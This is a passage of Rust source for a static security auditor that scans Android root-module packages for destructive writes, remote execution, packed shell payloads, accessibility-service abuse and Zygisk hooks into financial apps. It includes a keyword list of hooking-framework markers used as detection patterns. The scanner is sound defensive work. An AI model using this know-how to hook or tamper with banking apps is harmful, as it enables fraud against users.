#![deny(unsafe_code)]

use anyhow::{Context, Result, bail, ensure};
use flate2::read::GzDecoder;
use serde::{Deserialize, Serialize};
use sha2::{Digest, Sha256};
use std::collections::{BTreeMap, BTreeSet};
use std::fs::File;
use std::io::{Cursor, Read, Seek};
use std::path::Path;

const RULE_PARTITION_WRITE: &str = "KSU-AUDIT-FS-001";
const RULE_DESTRUCTIVE_WRITE_UNKNOWN: &str = "KSU-AUDIT-FS-002";
const RULE_FLASH_TOOL: &str = "KSU-AUDIT-FS-003";
const RULE_BROAD_DELETE: &str = "KSU-AUDIT-FS-010";
const RULE_OWN_DELETE: &str = "KSU-AUDIT-FS-011";
const RULE_UNKNOWN_DELETE: &str = "KSU-AUDIT-FS-012";
const RULE_NETWORK: &str = "KSU-AUDIT-NET-001";
const RULE_BINARY_NETWORK: &str = "KSU-AUDIT-NET-002";
const RULE_REMOTE_EXECUTION: &str = "KSU-AUDIT-NET-003";
const RULE_BINARY_PRESENT: &str = "KSU-AUDIT-BIN-001";
const RULE_BINARY_EXECUTED: &str = "KSU-AUDIT-BIN-002";
const RULE_PACKED_SHELL: &str = "KSU-AUDIT-PACK-001";
const RULE_UNPACK_LIMIT: &str = "KSU-AUDIT-PACK-002";
const RULE_UNAUDITABLE_DECODER: &str = "KSU-AUDIT-PACK-003";
const RULE_UNINSPECTABLE_SYMLINK: &str = "KSU-AUDIT-PACK-004";
const RULE_PERSISTENT_SCRIPT: &str = "KSU-AUDIT-PERSIST-001";
const RULE_UNAUDITABLE_PERSISTENT_SCRIPT: &str = "KSU-AUDIT-PERSIST-002";
const RULE_INVOKED_SCRIPT: &str = "KSU-AUDIT-SCRIPT-001";
const RULE_ARCHIVE_PATH: &str = "KSU-AUDIT-ZIP-001";
const RULE_ARCHIVE_LIMIT: &str = "KSU-AUDIT-ZIP-002";
const RULE_FINANCIAL_SCRIPT_MODIFICATION: &str = "KSU-AUDIT-FIN-001";
const RULE_FINANCIAL_BINARY_MODIFICATION: &str = "KSU-AUDIT-FIN-002";
const RULE_FINANCIAL_ACCESSIBILITY_PAYLOAD: &str = "KSU-AUDIT-FIN-003";
const RULE_APK_PRESENT: &str = "KSU-AUDIT-APK-001";
const RULE_APK_ACCESSIBILITY_SERVICE: &str = "KSU-AUDIT-APK-002";
const RULE_APK_INSTALL: &str = "KSU-AUDIT-APK-003";
const RULE_APK_UNINSPECTABLE: &str = "KSU-AUDIT-APK-004";
const RULE_PRIVILEGED_PERMISSION_GRANT: &str = "KSU-AUDIT-PRIV-001";
const RULE_ACCESSIBILITY_HIJACK: &str = "KSU-AUDIT-PRIV-002";
const RULE_ZYGISK_PAYLOAD: &str = "KSU-AUDIT-ZYGISK-001";
const RULE_ZYGISK_UNINSPECTABLE: &str = "KSU-AUDIT-ZYGISK-002";
const RULE_FINANCIAL_ZYGISK_INJECTION: &str = "KSU-AUDIT-FIN-004";
const MAX_INDEXED_SOURCE_SIZE: usize = 4 * 1024 * 1024;
const MIN_CONTENT_PAYLOAD_LENGTH: usize = 24;
const MAX_CONTENT_PAYLOAD_LENGTH: usize = 1024 * 1024;
const MAX_CONTENT_CANDIDATES: usize = 128;
const MAX_CONTENT_PROBES: usize = 512;
const MAX_CONTENT_PROBE_DEPTH: usize = 4;

#[derive(Clone, Copy, Debug, Deserialize, Eq, Ord, PartialEq, PartialOrd, Serialize)]
#[serde(rename_all = "lowercase")]
pub enum Severity {
    Info,
    Notice,
    High,
    Critical,
}

impl Severity {
    #[must_use]
    pub const fn requires_confirmation(self) -> bool {
        matches!(self, Self::Notice | Self::High | Self::Critical)
    }
}

#[derive(Clone, Debug, Deserialize, Eq, PartialEq, Serialize)]
pub struct Finding {
    pub rule_id: String,
    pub severity: Severity,
    pub path: String,
    pub line: Option<usize>,
    pub title: String,
    pub evidence: String,
    pub provenance: Vec<String>,
}

#[derive(Clone, Debug, Deserialize, Eq, PartialEq, Serialize)]
pub struct AuditReport {
    pub schema_version: u32,
    pub package_sha256: String,
    pub module_id: Option<String>,
    pub findings: Vec<Finding>,
    pub scanned_files: usize,
    pub derived_artifacts: usize,
}

impl AuditReport {
    #[must_use]
    pub fn requires_confirmation(&self) -> bool {
        self.findings
            .iter()
            .any(|finding| finding.severity.requires_confirmation())
    }

    #[must_use]
    pub fn has_critical(&self) -> bool {
        self.findings
            .iter()
            .any(|finding| finding.severity == Severity::Critical)
    }

    #[must_use]
    pub fn required_confirmation_presses(&self) -> usize {
        if !self.requires_confirmation() {
            0
        } else if self.has_critical() {
            2
        } else {
            1
        }
    }

    #[must_use]
    pub fn count(&self, severity: Severity) -> usize {
        self.findings
            .iter()
            .filter(|finding| finding.severity == severity)
            .count()
    }
}

#[derive(Clone, Debug)]
pub struct AuditConfig {
    pub max_entries: usize,
    pub max_file_size: usize,
    pub max_total_size: usize,
    pub max_unpack_depth: usize,
    pub max_derived_size: usize,
}

impl Default for AuditConfig {
    fn default() -> Self {
        Self {
            max_entries: 4096,
            max_file_size: 32 * 1024 * 1024,
            max_total_size: 128 * 1024 * 1024,
            max_unpack_depth: 16,
            max_derived_size: 64 * 1024 * 1024,
        }
    }
}

#[derive(Clone)]
struct Artifact {
    path: String,
    bytes: Vec<u8>,
    provenance: Vec<String>,
    depth: usize,
    force_shell: bool,
}

#[derive(Clone)]
struct BinaryProfile {
    path: String,
    basename: String,
    base64_like: bool,
    openssl_like: bool,
}

struct DecodedCandidate {
    line: usize,
    bytes: Vec<u8>,
    transform: String,
    evidence: String,
}

#[derive(Default)]
struct ZygiskContext {
    native_paths: BTreeSet<String>,
    dex_paths: BTreeSet<String>,
    configured_targets: BTreeSet<String>,
    entrypoint: Option<String>,
}

#[derive(Default)]
struct ScanState {
    findings: Vec<Finding>,
    seen_derived: BTreeSet<String>,
    derived_bytes: usize,
    derived_artifacts: usize,
    binaries: Vec<String>,
    binary_profiles: Vec<BinaryProfile>,
    archive_files: BTreeMap<String, Vec<u8>>,
    scripts: Vec<(String, String, Vec<String>)>,
    audited_scripts: BTreeSet<String>,
    zygisk: ZygiskContext,
}

pub fn scan_zip_path(path: impl AsRef<Path>, config: &AuditConfig) -> Result<AuditReport> {
    let package_sha256 = sha256_path(&path)?;
    let file = File::open(path.as_ref())
        .with_context(|| format!("open module ZIP {}", path.as_ref().display()))?;
    scan_zip_reader(file, package_sha256, config)
}

pub fn scan_zip_bytes(bytes: &[u8], config: &AuditConfig) -> Result<AuditReport> {
    scan_zip_reader(Cursor::new(bytes), sha256_bytes(bytes), config)
}

pub fn scan_file_bytes(path: impl Into<String>, bytes: &[u8], config: &AuditConfig) -> AuditReport {
    let mut state = ScanState::default();
    scan_artifact(
        Artifact {
            path: path.into(),
            bytes: bytes.to_vec(),
            provenance: Vec::new(),
            depth: 0,
            force_shell: false,
        },
        None,
        config,
        &mut state,
    );
    finish_report(sha256_bytes(bytes), None, 1, state)
}

pub fn scan_directory_path(path: impl AsRef<Path>, config: &AuditConfig) -> Result<AuditReport> {
    let root = path.as_ref();
    ensure!(
        root.is_dir(),
        "module directory does not exist: {}",
        root.display()
    );
    let mut pending = vec![root.to_path_buf()];
    let mut files = Vec::new();
    let mut state = ScanState::default();
    while let Some(directory) = pending.pop() {
        let mut entries = std::fs::read_dir(&directory)
            .with_context(|| format!("read module directory {}", directory.display()))?
            .collect::<std::result::Result<Vec<_>, _>>()?;
        entries.sort_by_key(std::fs::DirEntry::file_name);
        for entry in entries.into_iter().rev() {
            let file_type = entry.file_type()?;
            if file_type.is_symlink() {
                let relative = entry
                    .path()
                    .strip_prefix(root)?
                    .to_string_lossy()
                    .replace('\\', "/");
                let target = std::fs::read_link(entry.path())
                    .map(|path| path.to_string_lossy().into_owned())
                    .unwrap_or_else(|error| format!("unreadable target: {error}"));
                state.findings.push(Finding {
                    rule_id: RULE_UNINSPECTABLE_SYMLINK.to_owned(),
                    severity: Severity::High,
                    path: relative,
                    line: None,
                    title: "Symbolic link was not followed".to_owned(),
                    evidence: target,
                    provenance: Vec::new(),
                });
                continue;
            }
            if file_type.is_dir() {
                pending.push(entry.path());
            } else if file_type.is_file() {
                files.push(entry.path());
            }
        }
    }
    files.sort();
    ensure!(
        files.len() <= config.max_entries,
        "module directory contains {} files, limit is {}",
        files.len(),
        config.max_entries
    );

    let mut entries = Vec::new();
    let mut total_size = 0_usize;
    let mut snapshot = Sha256::new();
    for file in files {
        let relative = file
            .strip_prefix(root)?
            .to_string_lossy()
            .replace('\\', "/");
        let declared_size = usize::try_from(file.metadata()?.len()).unwrap_or(usize::MAX);
        snapshot.update(relative.as_bytes());
        snapshot.update([0]);
        snapshot.update(declared_size.to_le_bytes());
        total_size = total_size.saturating_add(declared_size);
        if declared_size > config.max_file_size || total_size > config.max_total_size {
            state.findings.push(Finding {
                rule_id: RULE_ARCHIVE_LIMIT.to_owned(),
                severity: Severity::High,
                path: relative,
                line: None,
                title: "Installed-module analysis limit exceeded".to_owned(),
                evidence: format!(
                    "file size {declared_size} bytes; cumulative size {total_size} bytes"
                ),
                provenance: Vec::new(),
            });
            continue;
        }
        let bytes = std::fs::read(&file)
            .with_context(|| format!("read installed module file {}", file.display()))?;
        snapshot.update(&bytes);
        entries.push((relative, bytes));
    }
    let package_sha256 = hex_digest(snapshot.finalize().as_slice());
    Ok(scan_entries(entries, package_sha256, state, config))
}

pub fn sha256_path(path: impl AsRef<Path>) -> Result<String> {
    let mut file = File::open(path.as_ref())
        .with_context(|| format!("open {} for hashing", path.as_ref().display()))?;
    let mut hasher = Sha256::new();
    let mut buffer = [0_u8; 64 * 1024];
    loop {
        let read = file.read(&mut buffer)?;
        if read == 0 {
            break;
        }
        hasher.update(&buffer[..read]);
    }
    Ok(hex_digest(hasher.finalize().as_slice()))
}

fn scan_zip_reader<R: Read + Seek>(
    reader: R,
    package_sha256: String,
    config: &AuditConfig,
) -> Result<AuditReport> {
    let mut archive = zip::ZipArchive::new(reader).context("parse module ZIP")?;
    if archive.len() > config.max_entries {
        bail!(
            "module ZIP contains {} entries, limit is {}",
            archive.len(),
            config.max_entries
        );
    }

    let mut entries = Vec::new();
    let mut total_size = 0_usize;
    let mut state = ScanState::default();

    for index in 0..archive.len() {
        let mut entry = archive.by_index(index)?;
        let name = entry.name().replace('\\', "/");
        if !is_safe_zip_path(&name) {
            state.findings.push(Finding {
                rule_id: RULE_ARCHIVE_PATH.to_owned(),
                severity: Severity::Critical,
                path: name,
                line: None,
                title: "Unsafe archive path".to_owned(),
                evidence: "ZIP entry escapes the module root".to_owned(),
                provenance: Vec::new(),
            });
            continue;
        }
        if entry.is_dir() {
            continue;
        }

        let declared_size = usize::try_from(entry.size()).unwrap_or(usize::MAX);
        total_size = total_size.saturating_add(declared_size);
        if declared_size > config.max_file_size || total_size > config.max_total_size {
            state.findings.push(Finding {
                rule_id: RULE_ARCHIVE_LIMIT.to_owned(),
                severity: Severity::High,
                path: name,
                line: None,
                title: "Archive analysis limit exceeded".to_owned(),
                evidence: format!(
                    "declared file size {declared_size} bytes; cumulative size {total_size} bytes"
                ),
                provenance: Vec::new(),
            });
            continue;
        }

        let mut bytes = Vec::with_capacity(declared_size.min(config.max_file_size));
        entry
            .by_ref()
            .take(u64::try_from(config.max_file_size).unwrap_or(u64::MAX) + 1)
            .read_to_end(&mut bytes)?;
        if bytes.len() > config.max_file_size {
            state.findings.push(Finding {
                rule_id: RULE_ARCHIVE_LIMIT.to_owned(),
                severity: Severity::High,
                path: name,
                line: None,
                title: "File is too large to audit".to_owned(),
                evidence: format!("decoded size exceeds {} bytes", config.max_file_size),
                provenance: Vec::new(),
            });
            continue;
        }
        entries.push((name, bytes));
    }

    Ok(scan_entries(entries, package_sha256, state, config))
}

fn scan_entries(
    entries: Vec<(String, Vec<u8>)>,
    package_sha256: String,
    mut state: ScanState,
    config: &AuditConfig,
) -> AuditReport {
    let module_id = entries
        .iter()
        .find(|(path, _)| path == "module.prop")
        .and_then(|(_, bytes)| parse_module_id(bytes));
    let scanned_files = entries.len();
    state.zygisk = profile_zygisk_context(&entries);
    for (path, bytes) in &entries {
        if is_elf(bytes) {
            state.binary_profiles.push(profile_binary(path, bytes));
        } else if bytes.len() <= MAX_INDEXED_SOURCE_SIZE {
            state.archive_files.insert(path.clone(), bytes.clone());
        }
    }
    for (path, bytes) in entries {
        scan_artifact(
            Artifact {
                path,
                bytes,
                provenance: Vec::new(),
                depth: 0,
                force_shell: false,
            },
            module_id.as_deref(),
            config,
            &mut state,
        );
    }
    finish_report(package_sha256, module_id, scanned_files, state)
}

fn profile_zygisk_context(entries: &[(String, Vec<u8>)]) -> ZygiskContext {
    let mut context = ZygiskContext::default();
    let module_properties = entries
        .iter()
        .find(|(path, _)| path == "module.prop")
        .map(|(_, bytes)| String::from_utf8_lossy(bytes));
    context.entrypoint = module_properties
        .as_deref()
        .and_then(|properties| parse_module_property(properties, "entrypoint"));

    for (path, bytes) in entries {
        let lower = path.to_ascii_lowercase();
        if is_zygisk_native_path(&lower) {
            context.native_paths.insert(path.clone());
        }
        if let Some(target) = lower.strip_prefix("packages/")
            && !target.is_empty()
            && !target.contains('/')
        {
            context.configured_targets.insert(target.to_owned());
            if let Ok(text) = std::str::from_utf8(bytes) {
                context.configured_targets.extend(
                    text.lines()
                        .map(str::trim)
                        .filter(|line| !line.is_empty() && !line.starts_with('#'))
                        .map(str::to_ascii_lowercase),
                );
            }
        }
    }
    if context.entrypoint.is_some() && !context.native_paths.is_empty() {
        for (path, _) in entries {
            let lower = path.to_ascii_lowercase();
            if !lower.contains('/') && lower.starts_with("classes") && lower.ends_with(".dex") {
                context.dex_paths.insert(path.clone());
            }
        }
    }
    context
}

fn parse_module_property(properties: &str, key: &str) -> Option<String> {
    properties.lines().find_map(|line| {
        let (candidate, value) = line.split_once('=')?;
        (candidate.trim() == key)
            .then(|| value.trim().to_owned())
            .filter(|value| !value.is_empty())
    })
}

fn is_zygisk_native_path(path: &str) -> bool {
    path.strip_prefix("zygisk/").is_some_and(|name| {
        !name.is_empty() && !name.contains('/') && name.to_ascii_lowercase().ends_with(".so")
    })
}

fn is_dex(bytes: &[u8]) -> bool {
    bytes.starts_with(b"dex\n") || bytes.starts_with(b"cdex")
}

fn analyze_zygisk_payload(artifact: &Artifact, state: &mut ScanState) {
    let is_native = state.zygisk.native_paths.contains(&artifact.path);
    let expected_format = if is_native {
        is_elf(&artifact.bytes)
    } else {
        is_dex(&artifact.bytes)
    };
    let entrypoint = state.zygisk.entrypoint.clone();
    let evidence = if is_native {
        "zygisk/<abi>.so is loaded automatically into app or system-server specialization"
            .to_owned()
    } else {
        format!(
            "root DEX payload is loaded through ZygoteLoader entrypoint {}",
            entrypoint.as_deref().unwrap_or("<unknown>")
        )
    };
    add_finding(
        state,
        artifact,
        RULE_ZYGISK_PAYLOAD,
        Severity::Notice,
        None,
        if is_native {
            "Native Zygisk injection payload"
        } else {
            "ZygoteLoader DEX injection payload"
        },
        &evidence,
    );
    if !expected_format {
        add_finding(
            state,
            artifact,
            RULE_ZYGISK_UNINSPECTABLE,
            Severity::High,
            None,
            "Zygisk payload format cannot be inspected",
            if is_native {
                "zygisk/*.so does not contain a valid ELF header"
            } else {
                "ZygoteLoader classes*.dex does not contain a valid DEX header"
            },
        );
        return;
    }

    let configured_financial =
        state.zygisk.configured_targets.iter().find_map(|target| {
            financial_target_marker(target).map(|marker| (target.clone(), marker))
        });
    let strings = extract_binary_strings(&artifact.bytes);
    let embedded_financial = strings
        .iter()
        .find_map(|value| financial_package_marker(value).map(|marker| (value.clone(), marker)));
    let Some((target, marker)) = configured_financial.or(embedded_financial) else {
        return;
    };
    if !is_native
        && let Some((severity, evidence)) = binary_financial_modification_evidence(&artifact.bytes)
    {
        add_finding(
            state,
            artifact,
            RULE_FINANCIAL_BINARY_MODIFICATION,
            severity,
            None,
            if severity == Severity::Critical {
                "Financial application modification in ZygoteLoader DEX code"
            } else {
                "Financial target and modification capability coexist in ZygoteLoader DEX"
            },
            &evidence,
        );
    }
    let Some(hook) = strings.iter().find_map(|value| {
        zygisk_hook_marker(value).map(|hook| (abbreviated_evidence(value), hook))
    }) else {
        return;
    };
    add_finding(
        state,
        artifact,
        RULE_FINANCIAL_ZYGISK_INJECTION,
        Severity::Critical,
        None,
        "Zygisk payload can hook a financial application process",
        &format!(
            "financial target {target} ({marker}); hook capability {} ({})",
            hook.0, hook.1
        ),
    );
}

fn zygisk_hook_marker(value: &str) -> Option<&'static str> {
    let lower = value.to_ascii_lowercase();
    [
        ("dobbyhook", "Dobby inline hook"),
        ("shadowhook_hook", "ShadowHook inline hook"),
        ("xhook_register", "xHook PLT hook"),
        ("hookjninativemethods", "Zygisk JNI native hook"),
        ("hook_jni_native_methods", "Zygisk JNI native hook"),
        ("plthookregister", "Zygisk PLT hook"),
        ("plt_hook_register", "Zygisk PLT hook"),
        ("xposedbridge", "Xposed method hook"),
        ("hookmethod", "Java method hook"),
        ("lsplant", "LSPlant ART hook"),
        ("mshookfunction", "Substrate inline hook"),
        ("a64hookfunction", "ARM64 inline hook"),
        ("inlinehook", "inline hook"),
        ("replacehookedmethod", "method replacement"),
    ]
    .iter()
    .find_map(|(needle, label)| lower.contains(needle).then_some(*label))
}

fn finish_report(
    package_sha256: String,
    module_id: Option<String>,
    scanned_files: usize,
    mut state: ScanState,
) -> AuditReport {
    correlate_binary_execution(&mut state);
    let mut consolidated: BTreeMap<_, Finding> = BTreeMap::new();
    for finding in state.findings {
        let key = (
            finding.rule_id.clone(),
            finding.path.clone(),
            finding.line,
            finding.title.clone(),
            finding.evidence.clone(),
        );
        match consolidated.get_mut(&key) {
            Some(existing) if finding.provenance.len() > existing.provenance.len() => {
                existing.provenance = finding.provenance;
            }
            Some(_) => {}
            None => {
                consolidated.insert(key, finding);
            }
        }
    }
    state.findings = consolidated.into_values().collect();
    state.findings.sort_by(|left, right| {
        left.path
            .cmp(&right.path)
            .then(left.line.cmp(&right.line))
            .then(left.rule_id.cmp(&right.rule_id))
            .then(left.provenance.cmp(&right.provenance))
    });
    AuditReport {
        schema_version: 1,
        package_sha256,
        module_id,
        findings: state.findings,
        scanned_files,
        derived_artifacts: state.derived_artifacts,
    }
}

fn scan_artifact(
    artifact: Artifact,
    module_id: Option<&str>,
    config: &AuditConfig,
    state: &mut ScanState,
) {
    if state.zygisk.native_paths.contains(&artifact.path)
        || state.zygisk.dex_paths.contains(&artifact.path)
    {
        analyze_zygisk_payload(&artifact, state);
    }
    if is_apk(&artifact.path, &artifact.bytes) {
        scan_apk_artifact(&artifact, module_id, config, state);
        return;
    }

    if is_elf(&artifact.bytes) {
        state.binaries.push(artifact.path.clone());
        add_finding(
            state,
            &artifact,
            RULE_BINARY_PRESENT,
            Severity::Notice,
            None,
            "Precompiled ELF content",
            &describe_elf(&artifact.bytes),
        );
        if let Some(evidence) = binary_network_evidence(&artifact.bytes) {
            add_finding(
                state,
                &artifact,
                RULE_BINARY_NETWORK,
                Severity::Notice,
                None,
                "Precompiled binary contains network-client capability",
                &evidence,
            );
        }
        if let Some((severity, evidence)) = binary_financial_modification_evidence(&artifact.bytes)
        {
            add_finding(
                state,
                &artifact,
                RULE_FINANCIAL_BINARY_MODIFICATION,
                severity,
                None,
                if severity == Severity::Critical {
                    "Financial application modification in precompiled binary"
                } else {
                    "Financial target and modification capability coexist in binary"
                },
                &evidence,
            );
        }
        return;
    }

    if artifact.bytes.starts_with(&[0x1f, 0x8b]) {
        add_finding(
            state,
            &artifact,
            RULE_PACKED_SHELL,
            Severity::Notice,
            None,
            "Compressed executable content",
            "gzip stream decoded without executing it",
        );
        decode_gzip_artifact(artifact, "gzip stream", module_id, config, state);
        return;
    }

    let looks_shell = artifact.force_shell || looks_like_shell(&artifact.path, &artifact.bytes);
    let text = String::from_utf8_lossy(&artifact.bytes).into_owned();
    if looks_shell {
        let audit_key = format!("{}\0{}", artifact.path, sha256_bytes(&artifact.bytes));
        if !state.audited_scripts.insert(audit_key) {
            return;
        }
        state.scripts.push((
            artifact.path.clone(),
            text.clone(),
            artifact.provenance.clone(),
        ));
        analyze_shell(&artifact, &text, module_id, state);
        analyze_remote_execution_chain(&artifact, &text, module_id, state);
        analyze_persistent_script_writes(&artifact, &text, module_id, config, state);
        analyze_invoked_module_scripts(&artifact, &text, module_id, config, state);
    }

    let mut candidates = if looks_shell {
        decode_static_base64_payloads(&artifact, &text, module_id, state)
    } else {
        Vec::new()
    };
    let mut decoded_digests: BTreeSet<_> = candidates
        .iter()
        .map(|candidate| sha256_bytes(&candidate.bytes))
        .collect();
    if std::str::from_utf8(&artifact.bytes).is_ok() {
        for candidate in discover_content_base64_payloads(&text, module_id) {
            if decoded_digests.insert(sha256_bytes(&candidate.bytes)) {
                candidates.push(candidate);
            }
        }
    }
    for candidate in candidates {
        add_finding(
            state,
            &artifact,
            RULE_PACKED_SHELL,
            Severity::Notice,
            Some(candidate.line),
            "Encoded shell payload",
            &candidate.evidence,
        );
        scan_derived_bytes(
            artifact.clone(),
            candidate.bytes,
            &candidate.transform,
            module_id,
            config,
            state,
        );
    }
    if !looks_shell {
        return;
    }
    let (decoded_shells, unresolved_shells) = decode_static_shell_commands(&text, module_id);
    for (line, evidence) in unresolved_shells {
        add_finding(
            state,
            &artifact,
            RULE_UNAUDITABLE_DECODER,
            Severity::High,
            Some(line),
            "Dynamic shell payload cannot be fully reconstructed",
            &evidence,
        );
    }
    for (line, decoded) in decoded_shells {
        add_finding(
            state,
            &artifact,
            RULE_PACKED_SHELL,
            Severity::Notice,
            Some(line),
            "Static dynamic-shell payload",
            "literal eval/sh -c payload was extracted without executing it",
        );
        scan_derived_bytes(
            artifact.clone(),
            decoded,
            "literal dynamic shell",
            module_id,
            config,
            state,
        );
    }

    analyze_self_indexed_generated_scripts(&artifact, &text, module_id, config, state);

    let mut decoded_offsets = BTreeSet::new();
    if let Some((payload_offset, description)) = detect_gzexe(&artifact.bytes, &text) {
        decoded_offsets.insert(payload_offset);
        add_finding(
            state,
            &artifact,
            RULE_PACKED_SHELL,
            Severity::Notice,
            None,
            "Packed shell script",
            &description,
        );
        let payload = artifact.bytes[payload_offset..].to_vec();
        decode_gzip_artifact(
            Artifact {
                path: artifact.path.clone(),
                bytes: payload,
                provenance: artifact.provenance.clone(),
                depth: artifact.depth,
                force_shell: artifact.force_shell,
            },
            "gzexe/gzip payload",
            module_id,
            config,
            state,
        );
    }
    for (payload_offset, kind) in detect_embedded_self_extracting_payloads(&artifact.bytes, &text) {
        if !decoded_offsets.insert(payload_offset) {
            continue;
        }
        add_finding(
            state,
            &artifact,
            RULE_PACKED_SHELL,
            Severity::Notice,
            None,
            "Self-extracting executable payload",
            &format!("{kind} payload begins at byte offset {payload_offset}"),
        );
        let payload = artifact.bytes[payload_offset..].to_vec();
        if kind == "gzip" {
            decode_gzip_artifact(
                Artifact {
                    path: artifact.path.clone(),
                    bytes: payload,
                    provenance: artifact.provenance.clone(),
                    depth: artifact.depth,
                    force_shell: artifact.force_shell,
                },
                "embedded self-extracting gzip payload",
                module_id,
                config,
                state,
            );
        } else {
            scan_derived_bytes(
                artifact.clone(),
                payload,
                "embedded self-extracting ELF payload",
                module_id,
                config,
                state,
            );
        }
    }
}

fn scan_apk_artifact(
    artifact: &Artifact,
    module_id: Option<&str>,
    config: &AuditConfig,
    state: &mut ScanState,
) {
    add_finding(
        state,
        artifact,
        RULE_APK_PRESENT,
        Severity::Notice,
        None,
        "Android application package embedded in module",
        "APK contents are being inspected without executing or installing them",
    );
    if artifact.depth >= config.max_unpack_depth {
        add_finding(
            state,
            artifact,
            RULE_UNPACK_LIMIT,
            Severity::High,
            None,
            "APK inspection depth limit reached",
            &format!("maximum depth is {}", config.max_unpack_depth),
        );
        return;
    }

    let mut archive = match zip::ZipArchive::new(Cursor::new(&artifact.bytes)) {
        Ok(archive) => archive,
        Err(error) => {
            add_finding(
                state,
                artifact,
                RULE_APK_UNINSPECTABLE,
                Severity::High,
                None,
                "Embedded APK cannot be inspected",
                &error.to_string(),
            );
            return;
        }
    };
    if archive.len() > config.max_entries {
        add_finding(
            state,
            artifact,
            RULE_APK_UNINSPECTABLE,
            Severity::High,
            None,
            "Embedded APK exceeds entry limit",
            &format!(
                "APK contains {} entries, limit is {}",
                archive.len(),
                config.max_entries
            ),
        );
        return;
    }

    let apk_declares_accessibility = archive
        .by_name("AndroidManifest.xml")
        .ok()
        .and_then(|mut manifest| {
            let size = usize::try_from(manifest.size()).ok()?;
            (size <= config.max_file_size).then_some(())?;
            let mut bytes = Vec::with_capacity(size);
            manifest.read_to_end(&mut bytes).ok()?;
            Some(contains_accessibility_service_declaration(&bytes))
        })
        .unwrap_or(false);

    let mut apk_total_size = 0_usize;
    for index in 0..archive.len() {
        let mut entry = match archive.by_index(index) {
            Ok(entry) => entry,
            Err(error) => {
                add_finding(
                    state,
                    artifact,
                    RULE_APK_UNINSPECTABLE,
                    Severity::High,
                    None,
                    "Embedded APK entry cannot be opened",
                    &error.to_string(),
                );
                continue;
            }
        };
        if entry.is_dir() {
            continue;
        }
        let name = entry.name().replace('\\', "/");
        if !is_safe_zip_path(&name) {
            add_finding(
                state,
                artifact,
                RULE_APK_UNINSPECTABLE,
                Severity::High,
                None,
                "Embedded APK contains an unsafe path",
                &name,
            );
            continue;
        }
        let declared_size = usize::try_from(entry.size()).unwrap_or(usize::MAX);
        apk_total_size = apk_total_size.saturating_add(declared_size);
        let remaining = config.max_derived_size.saturating_sub(state.derived_bytes);
        if declared_size > config.max_file_size
            || apk_total_size > config.max_total_size
            || declared_size > remaining
        {
            add_finding(
                state,
                artifact,
                RULE_APK_UNINSPECTABLE,
                Severity::High,
                None,
                "Embedded APK analysis limit reached",
                &format!("{name}: declared size {declared_size} bytes"),
            );
            continue;
        }

        let mut bytes = Vec::with_capacity(declared_size.min(config.max_file_size));
        if let Err(error) = entry
            .by_ref()
            .take(u64::try_from(declared_size).unwrap_or(u64::MAX) + 1)
            .read_to_end(&mut bytes)
        {
            add_finding(
                state,
                artifact,
                RULE_APK_UNINSPECTABLE,
                Severity::High,
                None,
                "Embedded APK entry cannot be decoded",
                &format!("{name}: {error}"),
            );
            continue;
        }
        if bytes.len() > declared_size || bytes.len() > remaining {
            add_unpack_size_limit(state, artifact, config);
            continue;
        }
        if !is_relevant_apk_entry(&name, &bytes) {
            continue;
        }

        let nested_path = format!("{}!/{name}", artifact.path);
        let mut provenance = artifact.provenance.clone();
        provenance.push(format!(
            "APK entry extracted from {} (layer {})",
            artifact.path,
            artifact.depth.saturating_add(1)
        ));
        let nested = Artifact {
            path: nested_path,
            bytes,
            provenance,
            depth: artifact.depth + 1,
            force_shell: false,
        };
        state.derived_bytes += nested.bytes.len();
        state.derived_artifacts += 1;
        analyze_apk_entry(&nested, apk_declares_accessibility, state);
        scan_artifact(nested, module_id, config, state);
    }
}

fn analyze_apk_entry(artifact: &Artifact, apk_declares_accessibility: bool, state: &mut ScanState) {
    let inner_path = artifact.path.rsplit("!/").next().unwrap_or(&artifact.path);
    if inner_path == "AndroidManifest.xml"
        && contains_accessibility_service_declaration(&artifact.bytes)
    {
        add_finding(
            state,
            artifact,
            RULE_APK_ACCESSIBILITY_SERVICE,
            Severity::High,
            None,
            "Embedded APK declares an accessibility service",
            "manifest string pool contains an AccessibilityService/BIND_ACCESSIBILITY_SERVICE declaration",
        );
    }
    if apk_declares_accessibility
        && let Some(evidence) = compiled_financial_accessibility_evidence(&artifact.bytes)
    {
        add_finding(
            state,
            artifact,
            RULE_FINANCIAL_ACCESSIBILITY_PAYLOAD,
            Severity::High,
            None,
            "Accessibility APK references a financial app and control APIs",
            &evidence,
        );
    }
    if !is_elf(&artifact.bytes)
        && inner_path.ends_with(".dex")
        && let Some((severity, evidence)) = binary_financial_modification_evidence(&artifact.bytes)
    {
        add_finding(
            state,
            artifact,
            RULE_FINANCIAL_BINARY_MODIFICATION,
            severity,
            None,
            if severity == Severity::Critical {
                "Financial application modification in compiled APK code"
            } else {
                "Financial target and modification capability coexist in APK code"
            },
            &evidence,
        );
    }
}

fn is_relevant_apk_entry(path: &str, bytes: &[u8]) -> bool {
    path == "AndroidManifest.xml"
        || path.ends_with(".dex")
        || path.ends_with(".so")
        || path.ends_with(".sh")
        || path.ends_with(".apk")
        || is_elf(bytes)
        || bytes.starts_with(b"#!")
}

fn decode_gzip_artifact(
    artifact: Artifact,
    transform: &str,
    module_id: Option<&str>,
    config: &AuditConfig,
    state: &mut ScanState,
) {
    if artifact.depth >= config.max_unpack_depth {
        add_finding(
            state,
            &artifact,
            RULE_UNPACK_LIMIT,
            Severity::High,
            None,
            "Unpacking depth limit reached",
            &format!("maximum depth is {}", config.max_unpack_depth),
        );
        return;
    }

    let mut decoder = GzDecoder::new(Cursor::new(&artifact.bytes));
    let remaining = config.max_derived_size.saturating_sub(state.derived_bytes);
    if remaining == 0 {
        add_unpack_size_limit(state, &artifact, config);
        return;
    }
    let mut decoded = Vec::new();
    if let Err(error) = decoder
        .by_ref()
        .take(u64::try_from(remaining).unwrap_or(u64::MAX) + 1)
        .read_to_end(&mut decoded)
    {
        add_finding(
            state,
            &artifact,
            RULE_UNPACK_LIMIT,
            Severity::High,
            None,
            "Compressed payload could not be decoded",
            &error.to_string(),
        );
        return;
    }
    if decoded.len() > remaining {
        add_unpack_size_limit(state, &artifact, config);
        return;
    }

    scan_derived_bytes(artifact, decoded, transform, module_id, config, state);
}

fn scan_derived_bytes(
    artifact: Artifact,
    decoded: Vec<u8>,
    transform: &str,
    module_id: Option<&str>,
    config: &AuditConfig,
    state: &mut ScanState,
) {
    if artifact.depth >= config.max_unpack_depth {
        add_finding(
            state,
            &artifact,
            RULE_UNPACK_LIMIT,
            Severity::High,
            None,
            "Unpacking depth limit reached",
